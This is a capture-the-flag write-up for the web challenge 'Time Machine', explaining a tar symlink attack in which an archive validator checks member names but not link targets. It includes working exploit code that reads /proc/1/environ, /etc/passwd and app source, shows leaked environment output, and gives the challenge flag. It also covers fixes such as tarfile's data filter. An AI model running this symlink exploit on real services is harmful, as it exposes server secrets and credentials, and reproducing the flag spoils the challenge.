# Time Machine

## Challenge Information

| Field | Value |
| --- | --- |
| Category | Misc (Web) |
| Points | 475 |
| Author | xzhiyouu |
| Connection | `http://chal.thjcc.org:9005/` |
| Recovered source | [`artifacts/app.py`](artifacts/app.py) |
| Flag | `THJCC{th3_v3r1f13r_ch3ck3d_th3_n4m3_but_n0t_th3_l1nkn4m3}` |

> Upload your archives. Snapshot what you need. Powered by Python's `shutil`.

## Overview

A small Flask app that keeps a per-session "workspace" directory:

- **`POST /restore`** — upload an archive; it is validated and then unpacked
  into your workspace with `shutil.unpack_archive`.
- **`GET /snapshot`** — re-pack your whole workspace into `snapshot.zip` with
  `shutil.make_archive` and download it.
- **`POST /reset`** — wipe the workspace.

The flag lives outside the workspace (in the container's environment). The bug —
named by the flag itself — is that the archive validator inspects each member's
**name** but never its **symlink target**. A tar symlink with an innocuous name
and an absolute target passes validation, is extracted verbatim, and then
`make_archive` **follows it** when building the snapshot, giving an arbitrary
out-of-tree file read.

## 1. Mapping the App

The page exposes three endpoints and accepts `.zip / .tar / .tar.gz / .tgz /
.tar.bz2 / .tar.xz`. A benign round-trip confirms the model — restore extracts
into a session directory, snapshot zips it back:

```bash
echo hi > note.txt && tar -cf a.tar note.txt
curl -c j -b j -F archive=@a.tar http://chal.thjcc.org:9005/restore
curl -c j -b j -o snap.zip        http://chal.thjcc.org:9005/snapshot
unzip -l snap.zip           # -> note.txt
```

So whatever ends up in the workspace comes back out in the snapshot. The
question is how to make something *outside* the workspace end up "in" it.

## 2. The Vulnerable Validator

The recovered [`app.py`](artifacts/app.py) validates uploads before unpacking:

```python
def escapes(name: str) -> bool:
    if not name:
        return True
    if name.startswith("/") or os.path.isabs(name):
        return True
    return ".." in name.replace("\\", "/").split("/")

def verify_archive(path: str) -> None:
    if tarfile.is_tarfile(path):
        with tarfile.open(path) as tf:
            for member in tf.getmembers():
                if escapes(member.name):          # <-- only member.name
                    raise UnsafeArchive(...)
    ...
    shutil.unpack_archive(staged, root)
```

The check is entirely about the entry **name**: it blocks classic Zip-Slip /
path-traversal (`../…`, `/abs/…`). But a tar member can be a **symlink**, and a
symlink has two independent fields:

- `name` — where the link file is created (must be in-tree ✓),
- `linkname` — where the link **points** (never inspected).

So a member named `loot` (perfectly safe) with `linkname = /proc/1/environ`
sails through `verify_archive` untouched.

## 3. Why the Symlink Survives and Gets Followed

Two more facts make the read work end to end:

- **Extraction keeps the symlink.** The server runs Python **3.13**
  (`/usr/local/bin/python3.13 … gunicorn … app:app`, read from
  `/proc/1/cmdline`). `shutil.unpack_archive` → `tarfile.extractall` still uses
  the legacy *fully-trusted* extraction there (the safe `data` filter only
  becomes the default in 3.14), so the symlink is written into the workspace
  pointing at the absolute target.
- **Snapshot follows the symlink.** `GET /snapshot` calls
  `shutil.make_archive(..., "zip", root_dir=root)`, whose `os.walk` lists the
  symlinked *file* and whose `zipfile.write()` **opens and reads the target's
  contents** — so the target file's bytes are packed into `snapshot.zip`.

Note `/view` is *not* exploitable: it resolves `os.path.realpath` and rejects
anything outside the workspace. Only `make_archive` reads without a containment
check.

## 4. Exploiting It

Build a tar of symlinks — safe names, absolute out-of-tree targets — restore it,
and download the snapshot:

```python
import io, tarfile
buf = io.BytesIO()
with tarfile.open(fileobj=buf, mode="w") as tf:
    for i, target in enumerate(["/proc/1/environ", "/app/app.py", "/etc/passwd"]):
        info = tarfile.TarInfo(name=f"loot_{i}")
        info.type = tarfile.SYMTYPE
        info.linkname = target          # never validated
        tf.addfile(info)
```

`POST /restore` → validator sees names `loot_0…` (in-tree, OK) → symlinks
extracted. `GET /snapshot` → the zip now contains the **contents** of each
target. Reading them back:

```text
=== /etc/passwd ===        root:x:0:0:root:/root:/bin/bash …          (read works)
=== /app/app.py ===        the full vulnerable source                 (confirms the bug)
=== /proc/1/environ ===
    HOME=/home/app
    PWD=/app
    FLAG=THJCC{th3_v3r1f13r_ch3ck3d_th3_n4m3_but_n0t_th3_l1nkn4m3}
```

The flag was in the process environment the whole time; dumping
`/proc/1/environ` (NUL-separated) reveals it. (The same read also leaks
`SECRET_KEY`, enough to forge session cookies — but the `sid` is validated to 32
hex chars and only names your own workspace, so that's a dead end here.)

Dangling targets (`/flag`, `/app/flag.txt`, …) simply don't appear in the
snapshot, so a single upload of many symlinks doubles as a file-existence probe.

## 5. Automated Exploit

[`exploit.py`](exploit.py) is standard-library only. It builds the symlink tar
in memory, drives the session, and prints every exfiltrated file plus the flag:

```bash
python3 exploit.py                      # defaults to the challenge URL
python3 exploit.py http://host:9005 /etc/hostname   # add extra paths
```

```text
[+] restored 4 symlinks
[+] snapshot.zip: 2973 bytes
=== /proc/1/environ (417 bytes) ===
... FLAG=THJCC{th3_v3r1f13r_ch3ck3d_th3_n4m3_but_n0t_th3_l1nkn4m3}
flag: THJCC{th3_v3r1f13r_ch3ck3d_th3_n4m3_but_n0t_th3_l1nkn4m3}
```

## The Fix

The verifier must treat the link *target* as hostile too — the flag spells it
out: *checked the name but not the linkname*. Concretely:

- Reject or resolve `member.linkname` / `member.linkpath` for **both** symlinks
  and hardlinks, ensuring the resolved path stays inside the destination.
- Or simply let `tarfile` do it: extract with `filter="data"` (PEP 706), which
  refuses absolute/traversing links and device nodes — the default from Python
  3.14 and available from 3.12.
- And on the way *out*, `make_archive` / manual zipping should not follow
  symlinks that leave the archived root.

## Lessons

- **Validate the whole member, not just its name.** Path-traversal defenses that
  look only at entry names miss symlink and hardlink targets entirely.
- **Extraction and re-archiving are two separate trust boundaries.** Here the
  extractor happily wrote a wild symlink and the archiver happily read through
  it; either one alone would have been harmless.
- **`shutil` archive helpers are not a security boundary.** `unpack_archive` /
  `make_archive` follow the host's normal symlink semantics — sanitising is the
  caller's job, best delegated to `tarfile`'s `data` filter.

## Flag

```text
THJCC{th3_v3r1f13r_ch3ck3d_th3_n4m3_but_n0t_th3_l1nkn4m3}
```
